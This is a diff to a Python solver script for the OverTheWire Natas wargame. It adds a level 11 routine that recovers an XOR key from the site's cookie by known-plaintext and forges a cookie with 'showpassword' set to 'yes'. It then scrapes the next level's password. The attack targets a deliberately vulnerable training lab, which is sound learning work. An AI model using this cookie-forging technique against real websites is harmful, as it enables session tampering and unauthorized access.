@@ -1,13 +1,13 @@
 import http.client
-import base64
-import re
+import urllib.parse
+import re, base64, json
 
 host = "natas.labs.overthewire.org"
 login = "natas"
 passwords = ["natas0"]
 level = -1
 
-def req(method, url, headers = {}, body=""):
+def req(method, url, headers={}, body=""):
     auth = base64.b64encode("{}{}:{}".format(login, level, passwords[level]).encode()).decode()
     headers["Authorization"] = "Basic {}".format(auth)
     conn = http.client.HTTPConnection("{}{}.{}".format(login, level, host))
@@ -20,7 +20,7 @@ def req(method, url, headers = {}, body=""):
     
     return(conn.getresponse())
 
-def rex(method, url, regexp, headers = {}, body=""):
+def rex(method, url, regexp, headers={}, body=""):
     print(" Request to web server: ", end="")
     res = req(method, url, headers, body)
     reg = None
@@ -32,6 +32,57 @@ def rex(method, url, regexp, headers = {}, body=""):
         print("Error ({})".format(res.status))
 
     return(res, reg)
+
+def level11():
+    def enc(data, key):
+        out = ""
+        for i in range(0, len(data)):
+            out += chr(ord(data[i]) ^ ord(key[i % len(key)]))
+
+        return(out)
+    
+    print(" Get cookie")
+    res, reg = rex("GET", "/", "")
+    
+    if res.status != 200: return
+    c = res.getheader("Set-Cookie")
+    print(" Decoding cookie {}".format(c))
+    c = c.split("=")
+    if len(c) != 2 or c[0] != "data":
+        print(" Unknown cookie format")
+        return
+
+    c = urllib.parse.unquote(c[1])
+    d = base64.b64decode(c).decode()[:-1] # Remove last char 0x0c (form feed)
+    key = enc(
+        d,
+        json.dumps(
+            {"showpassword": "no", "bgcolor": "#ffffff"},
+            separators=(",", ":"),
+        ),
+    )
+    
+    print(" Key {}".format(key))
+
+    c = json.dumps(
+        {"showpassword": "yes", "bgcolor": "#ffffff"},
+        separators=(",", ":"),
+    )
+
+    c = "data=" + urllib.parse.quote(base64.b64encode(enc(c, key).encode()).decode())
+    print(" Set new cookie to {}".format(c))
+    res, reg = rex(
+        "GET",
+        "/",
+        "The password for natas12 is (\w+)<br>",
+        headers={"Cookie": c}
+    )
+    
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
 
 print("___________________________")
 print()
@@ -217,6 +268,7 @@ while True:
                 print(" Password found: {}".format(passwords[level + 1]))
             else:
                 print(" Password not found")
+        elif level == 11: level11()
         else:
             print("Level must be between 1-34")
     else:
